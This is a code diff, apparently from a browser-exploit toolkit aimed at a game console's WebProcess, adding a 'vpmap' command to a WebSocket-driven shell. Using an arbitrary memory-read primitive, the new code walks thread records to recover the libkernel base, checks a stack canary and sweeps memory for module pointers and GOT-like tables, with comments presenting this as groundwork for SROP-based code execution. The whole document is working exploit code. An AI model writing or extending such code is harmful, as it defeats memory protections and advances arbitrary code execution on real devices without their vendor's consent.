@@ -4768,6 +4768,76 @@ function _startWsShell(){
         break;
       }
 
+      case 'vpmap':{
+        /* THE #295 FORWARD-MAP SWEEP (session 224, PURE READS, zero risk).
+         * Their second bench left two open asks: a GOT-like page at
+         * VP+0x110000 and 24-byte {kind=5,len,ptr,extra} records at
+         * VP+0x10CC48 - untyped .data that may be the SPRX linkage/module
+         * metadata. If the ptr fields resolve modules, we get the SPRX
+         * base list (libc included) from the WebProcess side -> the NID
+         * walk -> DIRECT stub verification (0x13ED0 etc.) without a
+         * single fire. ALL REGIONS: the readable band
+         * [BASE+0x7000000, BASE+0x7400000) (the scan gate's own band) +
+         * the proven thread-record addresses the sropfire walk reads
+         * every session. NO calls, NO writes. */
+        try{
+          /* the proven pthread-backlink lk chain (pure reads, the SROP-1 shape) */
+          var entV=S.absRead(0x10001c8000n,0x100),trV=0n;
+          for(var eV=0;eV<entV.length;eV++){if(entV[eV]>=0x10001f0000n&&entV[eV]<0x1000200000n){trV=entV[eV];break;}}
+          if(trV===0n){reply.err='no thread-record ptr';break;}
+          var trrV=S.absRead(trV,0x60),ptV=0n;
+          for(var tV=0;tV<trrV.length;tV++){if(trrV[tV]>=0x880000000n&&trrV[tV]<0x900000000n){ptV=trrV[tV];break;}}
+          if(ptV===0n){reply.err='no pthread ptr';break;}
+          var ndV=ptV,qV=0n;
+          for(var hV=0;hV<5;hV++){
+            var ppV=S.absRead(ndV,0x60);qV=ppV[8];
+            if((qV&0x3fffn)===0x218n&&qV>0x800000000n)break;
+            ndV=qV-0x38n;
+          }
+          if((qV&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var lkV=qV-0x6C218n;
+          if(!(S.absRead(lkV+0x751D0n,8)[0]>0x1000000n)){reply.err='canary fail';break;}
+          reply.lk='0x'+lkV.toString(16);
+          reply.base='0x'+S.BASE.toString(16);
+          var VPV=S.BASE+0x724DB28n;
+          reply.VP='0x'+VPV.toString(16);
+          /* (a) the 24-byte record block at VP+0x10CC40 (0x180 = 16 records) */
+          reply.k5raw=S.absRead(VPV+0x10CC40n,0x180).map(function(w){return'0x'+w.toString(16);});
+          /* (b) the GOT-like page head at VP+0x110000 */
+          reply.gotpage=S.absRead(VPV+0x110000n,0x200).map(function(w){return'0x'+w.toString(16);});
+          /* (c) the eight tag=1 records at VP+0x120000 */
+          reply.tag1=S.absRead(VPV+0x120000n,0x100).map(function(w){return'0x'+w.toString(16);});
+          /* (d) the pointer sweep over VP+0x10000..VP+0x120000, 16KB chunks.
+           * Module-band hits (0x8..) clustered by 64MB band; the libkernel
+           * class (within lk..lk+0x200000) tagged with the lk delta for
+           * immediate attribution checks; heap-band hits (0x10..) sampled
+           * for the rtld-Obj_Entry-class pointer chains. */
+          var hitsV=[],lkHitsV=[],heapV=[],histV={};
+          for(var offV=0x10000;offV<0x120000;offV+=0x4000){
+            var chV=S.absRead(VPV+BigInt(offV),0x4000);
+            for(var iV=0;iV<chV.length;iV++){
+              var vV=chV[iV];
+              if(vV>=0x800000000n&&vV<0x1000000000n){
+                var aV=VPV+BigInt(offV+iV*8);
+                var bK='0x'+(vV>>26n).toString(16);
+                histV[bK]=(histV[bK]||0)+1;
+                if(hitsV.length<256)hitsV.push({a:'0x'+aV.toString(16),v:'0x'+vV.toString(16)});
+                if(vV>=lkV&&vV<lkV+0x200000n&&lkHitsV.length<128){
+                  lkHitsV.push({a:'0x'+aV.toString(16),v:'0x'+vV.toString(16),d:'0x'+(vV-lkV).toString(16)});
+                }
+              }else if(vV>=0x1000000000n&&vV<0x1100000000n&&heapV.length<64){
+                heapV.push({a:'0x'+(VPV+BigInt(offV+iV*8)).toString(16),v:'0x'+vV.toString(16)});
+              }
+            }
+          }
+          reply.hist=histV;
+          reply.lkHits=lkHitsV;
+          reply.heapHits=heapV;
+          reply.hits=hitsV;
+        }catch(eV){reply.err='vpmap fault: '+String(eV&&eV.message?eV.message:'?');}
+        break;
+      }
+
       case 'scan':{
         var start=BigInt(msg.start),len=parseInt(msg.len)||0x10000;
         /* SHELL: scans use a RANGE-MEMBERSHIP check, not the single-read len cap -
